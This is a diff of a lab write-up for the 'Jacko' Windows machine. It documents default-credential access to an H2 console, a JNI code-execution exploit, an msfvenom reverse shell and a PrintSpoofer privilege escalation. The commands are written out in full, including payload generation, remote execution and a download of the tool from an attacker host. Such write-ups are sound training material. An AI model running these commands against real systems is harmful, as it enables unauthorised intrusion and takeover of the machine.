@@ -3,7 +3,7 @@ Alias: Jacko
 Date: 6/30/2022
 Platform: Windows
 Difficulty: Intermediate
-Tags: #H2Database1.4.199-JNICodeExecution 
+Tags: #H2Database1.4.199-JNICodeExecution #H2DatabaseConsoleCommandExecutionPayload #SeImpersonatePrivilege 
 Status: Finished
 IP: 192.168.172.66 
 ---
@@ -22,12 +22,11 @@ IP: 192.168.172.66
 - Utilized printspoofer64.exe binary to escalate privileges to nt authority\system
 
 ## Improved skills
-- ski
-- skill 2
+- Inputting payloads into exploits
 
 ## Used tools
 - nmap
-- gobuster
+- rustscan
 
 ---
 
@@ -134,17 +133,17 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to "http://192.168.195.66:8082" and found the following:
 
-![](Pasted%20image%2020221014085548.png)
+![](Images/Pasted%20image%2020221014085548.png)
 
 #### -Googled "H2 database http console default credentials" and found the following showing username "sa" and password is blank:
-![](Pasted%20image%2020221014085635.png)
+![](Images/Pasted%20image%2020221014085635.png)
 ![](../Images/Pasted%20image%2020220628031841.png)
 
 #### -Logged into the following H2 database with username "sa" and password left as blank and found the following web page:
 
-![](Pasted%20image%2020221014211701.png)
+![](Images/Pasted%20image%2020221014211701.png)
 
-![](Pasted%20image%2020221014211810.png)
+![](Images/Pasted%20image%2020221014211810.png)
 
 
 ---
@@ -155,11 +154,11 @@ Enumerated top 200 UDP ports:
 
 #### -Googled "H2 database http console exploit" and found the following exploit via the exploit-db webpage:
 
-![](Pasted%20image%2020221014211903.png)
+![](Images/Pasted%20image%2020221014211903.png)
 
-![](Pasted%20image%2020221014211954.png)
+![](Images/Pasted%20image%2020221014211954.png)
 
-![](Pasted%20image%2020221014212038.png)
+![](Images/Pasted%20image%2020221014212038.png)
 
 #### - Copied and pasted everything from the line below "-- Write native library" from the exploit code into the H2A database
 
@@ -169,11 +168,11 @@ Enumerated top 200 UDP ports:
 
 #### - Found we had code execution with command "whoami"
 
-![](Pasted%20image%2020221014212352.png)
+![](Images/Pasted%20image%2020221014212352.png)
 
 #### - Found  target machine was running on x64 architecture:
 
-![](Pasted%20image%2020221014212446.png)
+![](Images/Pasted%20image%2020221014212446.png)
 
 #### - Typed "msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=[Kali IP] LPORT=8082" on my kali machine to setup a reverse shell payload
 
@@ -186,18 +185,18 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');" and clicked run and received a reverse shell:
 
-![](Pasted%20image%2020221015164556.png)
+![](Images/Pasted%20image%2020221015164556.png)
 
 ---
 
 # Privilege Escalation
 ## Local Enumeration
 #### - Navigated to "C:\Windows\system32" and typed "whoami.exe /priv" and found SeImpersonatePrivilege was enabled:
-![](Pasted%20image%2020221015184540.png)
+![](Images/Pasted%20image%2020221015184540.png)
 #SeImpersonatePrivilege 
 
 #### - Typed "systeminfo.exe" and found the target machine was running on a x64 bit architecture:
-![](Pasted%20image%2020221015185752.png)
+![](Images/Pasted%20image%2020221015185752.png)
 
 
 ## Privilege Escalation vector
@@ -207,10 +206,10 @@ Enumerated top 200 UDP ports:
 
 #### -Hosted the printspoofer64.exe file on my kali machine and transferred the file to the target machine by typing "(new-object System.Net.WebClient).DownloadFile('http://[Kali IP]/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe') (new-object System.Net.WebClient).DownloadFile('http://192.168.49.114/PrintSpoofer64.exe','c:\Users\tony\PrintSpoofer64.exe')" while in powershell:
 
-![](Pasted%20image%2020221015185846.png)
+![](Images/Pasted%20image%2020221015185846.png)
 
 #### -Typed "./PrintSpoofer64.exe -i -c cmd" and received a shell running as nt authority\system:
-![](Pasted%20image%2020221015185953.png)
+![](Images/Pasted%20image%2020221015185953.png)
 
 
 ---
